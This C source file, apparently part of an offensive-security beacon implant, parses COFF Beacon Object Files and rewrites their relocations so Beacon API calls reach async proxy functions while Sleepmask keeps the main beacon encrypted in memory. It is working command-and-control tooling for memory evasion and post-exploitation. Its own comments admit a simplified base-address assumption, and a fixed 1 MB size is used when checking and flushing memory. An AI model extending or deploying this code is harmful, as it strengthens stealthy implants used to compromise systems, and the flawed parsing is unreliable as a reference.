/**
 * @file coff_patch.c
 * @brief COFF BOF Import Table Patching for Async-Safe Execution
 * @author Offensive Security Researcher
 * @date 2025
 *
 * This file implements COFF parsing and import table patching to replace
 * Beacon API calls with async-safe proxy functions.
 *
 * CRITICAL FOR SLEEPMASK COMPATIBILITY:
 * When the main beacon module is encrypted by Sleepmask, BOFs cannot
 * directly call Beacon APIs or they will crash. This module patches the
 * BOF's import table to redirect calls to async-safe proxy functions
 * that remain accessible even while the beacon is encrypted.
 */

#include "async_bof_implant.h"
#include <winnt.h>
#include <stdint.h>
#include <limits.h>

// ============================================================================
// COFF STRUCT DEFINITIONS (Minimal subset for BOF parsing)
// ============================================================================

#pragma pack(push, 1)

typedef struct _COFF_FILE_HEADER {
    uint16_t Machine;
    uint16_t NumberOfSections;
    uint32_t TimeDateStamp;
    uint32_t PointerToSymbolTable;
    uint32_t NumberOfSymbols;
    uint16_t SizeOfOptionalHeader;
    uint16_t Characteristics;
} COFF_FILE_HEADER;

typedef struct _COFF_SECTION_HEADER {
    char     Name[8];
    uint32_t VirtualSize;
    uint32_t VirtualAddress;
    uint32_t SizeOfRawData;
    uint32_t PointerToRawData;
    uint32_t PointerToRelocations;
    uint32_t PointerToLinenumbers;
    uint16_t NumberOfRelocations;
    uint16_t NumberOfLinenumbers;
    uint32_t Characteristics;
} COFF_SECTION_HEADER;

typedef struct _COFF_SYMBOL {
    char    Name[8];
    uint32_t Value;
    int16_t SectionNumber;
    uint16_t Type;
    uint8_t StorageClass;
    uint8_t NumberOfAuxSymbols;
} COFF_SYMBOL;

// Relocation types for x64
#define IMAGE_REL_AMD64_ADDR64     1   // 64-bit VA
#define IMAGE_REL_AMD64_REL32      4   // 32-bit relative address
#define IMAGE_REL_AMD64_REL32_1    5   // 32-bit relative address - 1
#define IMAGE_REL_AMD64_REL32_2    6   // 32-bit relative address - 2
#define IMAGE_REL_AMD64_REL32_3    7   // 32-bit relative address - 3
#define IMAGE_REL_AMD64_REL32_4    8   // 32-bit relative address - 4
#define IMAGE_REL_AMD64_REL32_5    9   // 32-bit relative address - 5

// Relocation entry
typedef struct _COFF_RELOCATION {
    uint32_t VirtualAddress;
    uint32_t SymbolTableIndex;
    uint16_t Type;
} COFF_RELOCATION, *PCOFF_RELOCATION;

// COFF symbol size (18 bytes as per COFF specification)
#define COFF_SYMBOL_SIZE 18

#pragma pack(pop)

// ============================================================================
// BEACON API FUNCTION MAPPING TABLE
// ============================================================================

/**
 * @brief Structure mapping Beacon API names to their async-safe replacements
 */
typedef struct _FUNCTION_PATCH {
    const char* szOriginalName;      // Original Beacon API name (e.g., "BeaconPrintf")
    LPVOID      pReplacementFunction; // Pointer to async-safe proxy
    size_t      nPatchCount;         // Number of times patched (for stats)
} FUNCTION_PATCH;

// Global patch table
static FUNCTION_PATCH g_PatchTable[] = {
    // Output functions
    {"BeaconPrintf",       AsyncBOF_ProxyBeaconPrintf, 0},
    {"BeaconOutput",       AsyncBOF_ProxyBeaconOutput, 0},
    {"BeaconError",        AsyncBOF_ProxyBeaconPrintf, 0},

    // Memory functions
    {"BeaconAlloc",        AsyncBOF_ProxyBeaconAlloc, 0},
    {"BeaconFree",         AsyncBOF_ProxyBeaconFree, 0},

    // Parsing functions (TODO: implement async-safe versions)
    // {"BeaconGetValue",       AsyncBOF_ProxyBeaconGetValue, 0},
    // {"BeaconGetParsedData",  AsyncBOF_ProxyBeaconGetParsedData, 0},

    // Signal functions
    {"BeaconWakeup",       AsyncBOF_BeaconWakeup, 0},
    {"BeaconGetStopJobEvent", AsyncBOF_GetStopJobEvent, 0},

    {NULL, NULL, 0} // Terminator
};

// ============================================================================
// COFF PARSING FUNCTIONS
// ============================================================================

/**
 * @brief Find the COFF file header in a BOF image
 * @param pBOFBase Base address of loaded BOF
 * @param nSize Size of BOF image
 * @return Pointer to COFF header, or NULL if invalid
 */
static COFF_FILE_HEADER* ValidateCOFFHeader(LPVOID pBOFBase, size_t nSize)
{
    if (pBOFBase == NULL || nSize < sizeof(COFF_FILE_HEADER)) {
        return NULL;
    }

    COFF_FILE_HEADER* pHeader = (COFF_FILE_HEADER*)pBOFBase;

    // Basic validation
    if (pHeader->Machine != 0x8664) { // IMAGE_FILE_MACHINE_AMD64
        // Not a valid x64 BOF
        return NULL;
    }

    if (pHeader->NumberOfSections > 16) { // Sanity check
        return NULL;
    }

    return pHeader;
}

/**
 * @brief Find a section by name in the COFF image
 * @param pHeader COFF file header
 * @param szName Section name (e.g., ".text", ".data")
 * @return Pointer to section header, or NULL if not found
 */
static COFF_SECTION_HEADER* FindSectionByName(
    COFF_FILE_HEADER* pHeader,
    const char* szName)
{
    COFF_SECTION_HEADER* pSection = (COFF_SECTION_HEADER*)((LPBYTE)pHeader +
        sizeof(COFF_FILE_HEADER));

    for (uint16_t i = 0; i < pHeader->NumberOfSections; i++) {
        if (strncmp(pSection[i].Name, szName, 8) == 0) {
            return &pSection[i];
        }
    }

    return NULL;
}

/**
 * @brief Find a symbol by name in the COFF symbol table
 * @param pHeader COFF file header
 * @param pBaseAddress Base address of BOF in memory
 * @param szSymbolName Symbol name to search for
 * @return Pointer to symbol structure, or NULL if not found
 *
 * Note: COFF stores symbol names in two ways:
 * 1. If name is <= 8 bytes, stored directly in Symbol.Name
 * 2. If name is > 8 bytes, Symbol.Name contains offset into string table
 */
static COFF_SYMBOL* FindSymbolByName(
    COFF_FILE_HEADER* pHeader,
    LPVOID pBaseAddress,
    const char* szSymbolName)
{
    if (pHeader->NumberOfSymbols == 0) {
        return NULL;
    }

    // Calculate symbol table location
    LPBYTE pSymbolTable = (LPBYTE)pBaseAddress + pHeader->PointerToSymbolTable;
    COFF_SYMBOL* pSymbols = (COFF_SYMBOL*)pSymbolTable;

    // String table starts after all symbols
    // Each symbol can have aux records, so we must count them
    LPBYTE pStringTable = pSymbolTable +
        (pHeader->NumberOfSymbols * COFF_SYMBOL_SIZE);

    for (uint32_t i = 0; i < pHeader->NumberOfSymbols; i++) {
        COFF_SYMBOL* pSym = &pSymbols[i];
        const char* szName = NULL;

        // Check if name is in string table (first 4 bytes are 0)
        if (pSym->Name[0] == 0 && pSym->Name[1] == 0 &&
            pSym->Name[2] == 0 && pSym->Name[3] == 0) {

            // Name is in string table
            uint32_t dwOffset = *(uint32_t*)pSym->Name;
            szName = (const char*)(pStringTable + dwOffset);
        } else {
            // Name is inline (8 chars max, not null-terminated)
            static char szInlineName[9];
            memcpy(szInlineName, pSym->Name, 8);
            szInlineName[8] = '\0';
            szName = szInlineName;
        }

        // Compare names
        if (strcmp(szName, szSymbolName) == 0) {
            return pSym;
        }

        // Skip aux symbols
        i += pSym->NumberOfAuxSymbols;
    }

    return NULL;
}

/**
 * @brief Apply a relocation to patch a function call
 * @param pRelocation Relocation entry to apply
 * @param pSectionBase Base address of the section being relocated
 * @param pSymbol Pointer to symbol being relocated
 * @param pTargetAddress New address to write (our proxy function)
 * @return TRUE if relocation was applied successfully
 */
static BOOL ApplyRelocation(
    COFF_RELOCATION* pRelocation,
    LPBYTE pSectionBase,
    COFF_SYMBOL* pSymbol,
    LPVOID pTargetAddress)
{
    if (pRelocation == NULL || pSectionBase == NULL || pTargetAddress == NULL) {
        return FALSE;
    }

    LPBYTE pPatchLocation = pSectionBase + pRelocation->VirtualAddress;

    // Apply relocation based on type
    switch (pRelocation->Type) {
    case IMAGE_REL_AMD64_ADDR64: {
        // 64-bit absolute address
        *(uint64_t*)pPatchLocation = (uint64_t)pTargetAddress;
        break;
    }

    case IMAGE_REL_AMD64_REL32:
    case IMAGE_REL_AMD64_REL32_1:
    case IMAGE_REL_AMD64_REL32_2:
    case IMAGE_REL_AMD64_REL32_3:
    case IMAGE_REL_AMD64_REL32_4:
    case IMAGE_REL_AMD64_REL32_5: {
        // 32-bit relative address
        // Calculate relative offset from patch location to target
        int64_t nRelativeOffset = (int64_t)pTargetAddress -
            (int64_t)pPatchLocation - sizeof(int32_t);

        // Adjust for specific relocation types
        int nAdjustment = 0;
        switch (pRelocation->Type) {
        case IMAGE_REL_AMD64_REL32_1: nAdjustment = 1; break;
        case IMAGE_REL_AMD64_REL32_2: nAdjustment = 2; break;
        case IMAGE_REL_AMD64_REL32_3: nAdjustment = 3; break;
        case IMAGE_REL_AMD64_REL32_4: nAdjustment = 4; break;
        case IMAGE_REL_AMD64_REL32_5: nAdjustment = 5; break;
        }

        nRelativeOffset -= nAdjustment;

        // Check if the offset fits in 32 bits
        if (nRelativeOffset < INT32_MIN || nRelativeOffset > INT32_MAX) {
            // Too far for RIP-relative addressing
            return FALSE;
        }

        *(int32_t*)pPatchLocation = (int32_t)nRelativeOffset;
        break;
    }

    default:
        // Unsupported relocation type
        return FALSE;
    }

    return TRUE;
}

// ============================================================================
// MAIN PATCHING FUNCTION
// ============================================================================

/**
 * @brief Parse and patch BOF imports to use async-safe functions
 * @param pBOFEntry BOF entry point address (used to locate COFF image)
 * @param pFunctionTable Pointer to async function table
 * @return TRUE if patching was successful
 *
 * This function:
 * 1. Parses the BOF's COFF format to locate the symbol table
 * 2. Finds references to Beacon* functions
 * 3. Replaces them with AsyncBOF_Proxy* alternatives
 * 4. Ensures BOF can safely run while beacon is encrypted
 *
 * CRITICAL: Must be called BEFORE the BOF starts execution
 */
BOOL AsyncBOF_PatchImports(
    LPVOID pBOFEntry,
    ASYNC_BOF_FUNCTION_TABLE* pFunctionTable)
{
    if (pBOFEntry == NULL || pFunctionTable == NULL) {
        return FALSE;
    }

    ASYNC_BOF_DEBUG("PatchImports: Starting import table patching");

    // Validate COFF header
    // Note: In real implementation, pBOFEntry is not the COFF base
    // We need to find the actual COFF base address
    // For now, assume pBOFEntry points near the COFF base
    LPVOID pCOFFBase = pBOFEntry; // Simplified - needs adjustment in production

    COFF_FILE_HEADER* pHeader = ValidateCOFFHeader(pCOFFBase, 1024 * 1024);
    if (pHeader == NULL) {
        ASYNC_BOF_DEBUG("PatchImports: Invalid COFF header");
        return FALSE;
    }

    DWORD dwTotalPatches = 0;

    // Iterate through each function in our patch table
    for (DWORD i = 0; g_PatchTable[i].szOriginalName != NULL; i++) {
        FUNCTION_PATCH* pPatch = &g_PatchTable[i];

        // Find the symbol in the COFF symbol table
        COFF_SYMBOL* pSymbol = FindSymbolByName(
            pHeader,
            pCOFFBase,
            pPatch->szOriginalName
        );

        if (pSymbol == NULL) {
            // BOF doesn't use this function, skip
            continue;
        }

        ASYNC_BOF_DEBUG("PatchImports: Found symbol '%s'", pPatch->szOriginalName);

        // Find which section this symbol is in
        if (pSymbol->SectionNumber <= 0 || pSymbol->SectionNumber > pHeader->NumberOfSections) {
            continue; // External symbol or invalid section
        }

        COFF_SECTION_HEADER* pSection = (COFF_SECTION_HEADER*)((LPBYTE)pHeader +
            sizeof(COFF_FILE_HEADER)) + (pSymbol->SectionNumber - 1);

        // Get the section data address in memory
        LPBYTE pSectionData = (LPBYTE)pCOFFBase + pSection->PointerToRawData;

        // Get the relocation table for this section
        COFF_RELOCATION* pRelocations = (COFF_RELOCATION*)((LPBYTE)pCOFFBase +
            pSection->PointerToRelocations);

        // Iterate through relocations in this section
        for (uint16_t j = 0; j < pSection->NumberOfRelocations; j++) {
            COFF_RELOCATION* pReloc = &pRelocations[j];

            // Check if this relocation references our target symbol
            if (pReloc->SymbolTableIndex == (pSymbol - (COFF_SYMBOL*)((LPBYTE)pCOFFBase +
                pHeader->PointerToSymbolTable))) {

                // Apply the patch
                if (ApplyRelocation(pReloc, pSectionData, pSymbol,
                                   pPatch->pReplacementFunction)) {

                    dwTotalPatches++;
                    pPatch->nPatchCount++;

                    ASYNC_BOF_DEBUG("PatchImports: Patched call to '%s' at offset 0x%X",
                                   pPatch->szOriginalName, pReloc->VirtualAddress);
                } else {
                    ASYNC_BOF_DEBUG("PatchImports: FAILED to patch '%s'",
                                   pPatch->szOriginalName);
                }
            }
        }
    }

    ASYNC_BOF_DEBUG("PatchImports: Applied %d patches total", dwTotalPatches);

    // Flush instruction cache to ensure patches take effect
    FlushInstructionCache(GetCurrentProcess(), pCOFFBase, 1024 * 1024);

    return (dwTotalPatches > 0);
}

/**
 * @brief Extended version with COFF base address parameter
 *
 * In production, the BOF entry point is not necessarily the COFF base.
 * This version accepts the actual COFF base address for accurate parsing.
 */
BOOL AsyncBOF_PatchImportsEx(
    LPVOID pCOFFBase,
    size_t nCOFFSize,
    ASYNC_BOF_FUNCTION_TABLE* pFunctionTable)
{
    if (pCOFFBase == NULL || nCOFFSize == 0 || pFunctionTable == NULL) {
        return FALSE;
    }

    ASYNC_BOF_DEBUG("PatchImportsEx: Starting with COFF at %p (size: %zu)",
                   pCOFFBase, nCOFFSize);

    // Validate COFF header
    COFF_FILE_HEADER* pHeader = ValidateCOFFHeader(pCOFFBase, nCOFFSize);
    if (pHeader == NULL) {
        ASYNC_BOF_DEBUG("PatchImportsEx: Invalid COFF header");
        return FALSE;
    }

    DWORD dwTotalPatches = 0;

    // Iterate through all sections to find relocations
    COFF_SECTION_HEADER* pSections = (COFF_SECTION_HEADER*)((LPBYTE)pCOFFBase +
        sizeof(COFF_FILE_HEADER));

    for (uint16_t i = 0; i < pHeader->NumberOfSections; i++) {
        COFF_SECTION_HEADER* pSection = &pSections[i];

        // Skip sections without relocations
        if (pSection->NumberOfRelocations == 0) {
            continue;
        }

        ASYNC_BOF_DEBUG("PatchImportsEx: Processing section '%.8s' (%d relocations)",
                       pSection->Name, pSection->NumberOfRelocations);

        // Get relocation table
        COFF_RELOCATION* pRelocations = (COFF_RELOCATION*)((LPBYTE)pCOFFBase +
            pSection->PointerToRelocations);

        // Get section data
        LPBYTE pSectionData = (LPBYTE)pCOFFBase + pSection->PointerToRawData;

        // Get symbol table
        LPBYTE pSymbolTable = (LPBYTE)pCOFFBase + pHeader->PointerToSymbolTable;
        COFF_SYMBOL* pSymbols = (COFF_SYMBOL*)pSymbolTable;

        // Process each relocation
        for (uint16_t j = 0; j < pSection->NumberOfRelocations; j++) {
            COFF_RELOCATION* pReloc = &pRelocations[j];

            // Get symbol for this relocation
            if (pReloc->SymbolTableIndex >= pHeader->NumberOfSymbols) {
                continue;
            }

            COFF_SYMBOL* pSymbol = &pSymbols[pReloc->SymbolTableIndex];

            // Get symbol name
            char szSymbolName[256];
            const char* szName = NULL;

            if (pSymbol->Name[0] == 0 && pSymbol->Name[1] == 0 &&
                pSymbol->Name[2] == 0 && pSymbol->Name[3] == 0) {
                // Name in string table
                uint32_t dwOffset = *(uint32_t*)pSymbol->Name;
                LPBYTE pStringTable = pSymbolTable +
                    (pHeader->NumberOfSymbols * COFF_SYMBOL_SIZE);
                szName = (const char*)(pStringTable + dwOffset);
            } else {
                // Inline name
                memcpy(szSymbolName, pSymbol->Name, 8);
                szSymbolName[8] = '\0';
                szName = szSymbolName;
            }

            // Check if this is a Beacon API we need to patch
            LPVOID pReplacement = NULL;
            for (DWORD k = 0; g_PatchTable[k].szOriginalName != NULL; k++) {
                if (strcmp(szName, g_PatchTable[k].szOriginalName) == 0) {
                    pReplacement = g_PatchTable[k].pReplacementFunction;
                    break;
                }
            }

            if (pReplacement != NULL) {
                // Apply the patch
                if (ApplyRelocation(pReloc, pSectionData, pSymbol, pReplacement)) {
                    dwTotalPatches++;
                    ASYNC_BOF_DEBUG("PatchImportsEx: Patched '%s' at offset 0x%X",
                                   szName, pReloc->VirtualAddress);
                }
            }
        }
    }

    ASYNC_BOF_DEBUG("PatchImportsEx: Applied %d patches", dwTotalPatches);

    // Flush instruction cache
    FlushInstructionCache(GetCurrentProcess(), pCOFFBase, nCOFFSize);

    return (dwTotalPatches > 0);
}

// ============================================================================
// UTILITY FUNCTIONS
// ============================================================================

/**
 * @brief Display patch statistics for debugging
 */
void AsyncBOF_DumpPatchStatistics(void)
{
    ASYNC_BOF_DEBUG("=== Patch Statistics ===");

    for (DWORD i = 0; g_PatchTable[i].szOriginalName != NULL; i++) {
        if (g_PatchTable[i].nPatchCount > 0) {
            ASYNC_BOF_DEBUG("  %s: %zu patches",
                           g_PatchTable[i].szOriginalName,
                           g_PatchTable[i].nPatchCount);
        }
    }

    ASYNC_BOF_DEBUG("========================");
}

/**
 * @brief Reset patch statistics
 */
void AsyncBOF_ResetPatchStatistics(void)
{
    for (DWORD i = 0; g_PatchTable[i].szOriginalName != NULL; i++) {
        g_PatchTable[i].nPatchCount = 0;
    }
}
